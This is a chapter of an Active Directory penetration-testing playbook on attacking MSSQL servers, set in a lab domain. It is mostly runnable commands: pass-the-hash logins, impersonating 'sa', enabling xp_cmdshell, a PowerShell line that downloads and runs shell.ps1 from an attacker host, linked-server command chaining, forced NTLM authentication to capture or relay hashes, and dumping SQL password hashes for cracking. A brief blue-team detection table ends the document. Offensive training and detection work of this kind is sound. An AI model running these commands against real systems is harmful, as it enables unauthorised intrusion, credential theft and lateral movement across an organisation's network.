# Phase 14: MSSQL Attacks

> MSSQL is extremely common in AD environments and is a major lateral movement / privilege escalation surface. Often runs as a service account with broad domain rights.

---

## Why MSSQL Matters

- Service accounts running MSSQL often have privileged AD rights (sometimes DA)
- `xp_cmdshell` = OS command execution from SQL
- Linked servers allow chaining across multiple SQL instances across the domain
- Impersonation lets you escalate within SQL to accounts with more rights
- MSSQL often runs as `NT AUTHORITY\SYSTEM` on the host — instant local admin

---

## 1. Discovery

```bash
# Find MSSQL instances via SPN enumeration
GetUserSPNs.py lab.local/jdoe:Password1 -dc-ip 10.10.10.10 | grep -i mssql
ldapdomaindump -u 'LAB\jdoe' -p 'Password1' ldap://10.10.10.10 -o /tmp/ld/
grep -i mssql /tmp/ld/domain_computers_by_os.html

# NetExec MSSQL scan
nxc mssql 10.10.10.0/24 -u jdoe -p Password1

# nmap
nmap -p 1433 --open 10.10.10.0/24
nmap -sV -p 1433 --script=ms-sql-info,ms-sql-config 10.10.10.50
```

```powershell
# PowerUpSQL discovery
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? {$_.Status -eq "Accessible"} | Get-SQLServerInfo
```

🟢 **OPSEC**: SPN-based discovery is LDAP only. Port scan to 1433 is noisy.

---

## 2. Connect

```bash
# Impacket — password
mssqlclient.py lab.local/jdoe:Password1@10.10.10.50

# Hash (PtH)
mssqlclient.py -hashes :8d969eef6ecad3c29a3a629280e686cf lab.local/administrator@10.10.10.50

# Windows auth (Kerberos)
export KRB5CCNAME=administrator.ccache
mssqlclient.py -k -no-pass dc01.lab.local
```

```powershell
# PowerUpSQL
Get-SQLQuery -Instance db01.lab.local -Query "SELECT @@VERSION"
Invoke-SQLOSCmd -Instance db01.lab.local -Command "whoami"
```

---

## 3. Recon Inside SQL

```sql
-- Who am I?
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- What logins exist?
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type_desc IN ('SQL_LOGIN','WINDOWS_LOGIN','WINDOWS_GROUP');

-- Who can I impersonate?
SELECT distinct b.name FROM sys.server_permissions a
  JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

-- Linked servers
SELECT srvname, isremote FROM master..sysservers;
EXEC sp_linkedservers;

-- What databases?
SELECT name FROM master..sysdatabases;
```

---

## 4. xp_cmdshell — OS Command Execution

> If you have `sysadmin` rights, enable `xp_cmdshell` and get OS-level code execution.

```sql
-- Enable (if disabled)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.10.99/shell.ps1'')"';

-- Disable after use (cleanup)
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

```bash
# From mssqlclient.py — enable_xp_cmdshell is a built-in command
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell type C:\Users\Administrator\Desktop\flag.txt
```

🔴 **OPSEC**: `xp_cmdshell` calls are logged in SQL Server Error Log and Windows Event Log (Event 4688 child of sqlservr.exe). Most SQL audit policies specifically flag `xp_cmdshell` execution.

---

## 5. Impersonation Chains

> If you can impersonate a SQL login with higher privileges (e.g., `sa`), you escalate without needing OS creds.

```sql
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
  JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate 'sa' (or any sysadmin-level login)
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;                        -- should now show 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin');      -- should return 1

-- Now enable xp_cmdshell as sa
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Revert
REVERT;
```

```bash
# PowerUpSQL automated
Invoke-SQLAuditPrivImpersonateLogin -Instance db01.lab.local -Verbose
Invoke-SQLEscalatePriv -Instance db01.lab.local -Verbose
```

🟡 **OPSEC**: Impersonation itself is a normal SQL operation — not specifically audited by default. Suspicious only if you then execute `xp_cmdshell`.

---

## 6. Linked Server Hopping

> A linked server allows one SQL instance to query another. If the link is configured with a privileged account, you can traverse the chain and execute commands across multiple servers.

```sql
-- Enum linked servers and their auth context
EXEC sp_linkedservers;
EXEC sp_helplinkedsrvlogin;

-- Query a linked server
SELECT * FROM OPENQUERY([DB02\SQLEXPRESS], 'SELECT SYSTEM_USER');

-- Enable xp_cmdshell on a linked server
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DB02\SQLEXPRESS];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DB02\SQLEXPRESS];
EXEC ('xp_cmdshell ''whoami''') AT [DB02\SQLEXPRESS];

-- Chain two hops deep
EXEC ('EXEC (''xp_cmdshell ''''whoami'''';'') AT [DB03\SQL]') AT [DB02\SQLEXPRESS];
```

```powershell
# PowerUpSQL automates link traversal
Get-SQLServerLinkCrawl -Instance db01.lab.local -Verbose
# Then execute commands across the chain:
Get-SQLServerLinkCrawl -Instance db01.lab.local -Query "exec master..xp_cmdshell 'whoami'"
```

**Real-world impact**: Often in a multi-server environment, `DB01 → DB02 → DB03` where DB03 runs as SYSTEM or a DA service account. You hop across until you hit a privileged context.

🟡 **OPSEC**: Linked server queries are logged in the target server's SQL audit log. The `AT [server]` syntax across hops makes the original source harder to trace — each server only sees the immediate predecessor.

---

## 7. Capture Net-NTLMv2 via MSSQL

> Force the MSSQL service account to authenticate to you via UNC path — captures its Net-NTLMv2 hash or relays it.

```sql
-- Trigger auth from the SQL service account to attacker (10.10.10.99)
EXEC xp_dirtree '\\10.10.10.99\share';
EXEC xp_fileexist '\\10.10.10.99\share\file.txt';
```

```bash
# On attacker — listen with Responder
sudo responder -I eth0 -dwPv
# Or relay immediately with ntlmrelayx
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support
```

If the MSSQL service runs as a domain account → you capture that account's hash → crack or relay.
If it runs as `SYSTEM` or `NT AUTHORITY\NETWORK SERVICE` → you get the machine account hash → use for RBCD or Silver Ticket.

🟡 **OPSEC**: UNC path coercion via `xp_dirtree` is a classic technique. DfI and network monitoring detect outbound SMB to unusual destinations from a database server.

---

## 8. Read Local Files

```sql
-- Read a local file via BULK INSERT
BULK INSERT #tmp FROM 'C:\Windows\System32\drivers\etc\hosts'
  WITH (ROWTERMINATOR='\n');
SELECT * FROM #tmp;

-- Or: OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\flag.txt', SINGLE_CLOB) AS f;
```

---

## 9. Stealing SQL Credentials

```sql
-- Linked server credentials (stored plaintext in registry for some configs)
EXEC sp_helplinkedsrvlogin;

-- SQL login password hashes
SELECT name, password_hash FROM sys.sql_logins;
-- Hash format: 0x02 prefix + SHA-512 — crack with hashcat mode 1731
```

```bash
hashcat -m 1731 sqlhash.txt wordlist.txt
```

---

## Privilege Escalation Path (Summary)

```
Domain user account
→ MSSQL accessible with domain creds
→ Check impersonation rights (EXECUTE AS LOGIN = 'sa')
→ Enable xp_cmdshell
→ OS command execution as SQL service account
→ If service = domain account: PtH / lateral move
→ If service = SYSTEM: dump local creds, RBCD via machine account
→ Check linked servers → repeat across chain
```

---

## Blue-Team Detection

| Action | Detection |
|--------|-----------|
| xp_cmdshell enable/exec | SQL Server audit, Event 4688 (sqlservr.exe child) |
| xp_dirtree UNC coercion | NetFlow outbound SMB from DB server, Event 4624 on target |
| Linked server hop | SQL Server audit on both instances |
| EXECUTE AS LOGIN | SQL Server audit (if login auditing enabled) |
| BULK INSERT file read | SQL Server audit |
| sys.sql_logins query | SQL Server audit (if object access auditing on) |

---

## Next Step

MSSQL service account has domain rights → **Phase 5: Lateral Movement** (`05-lateral-movement.md`)
Hash captured via UNC → crack and use → **Phase 4: Credential Attacks** (`04-credential-attacks.md`)
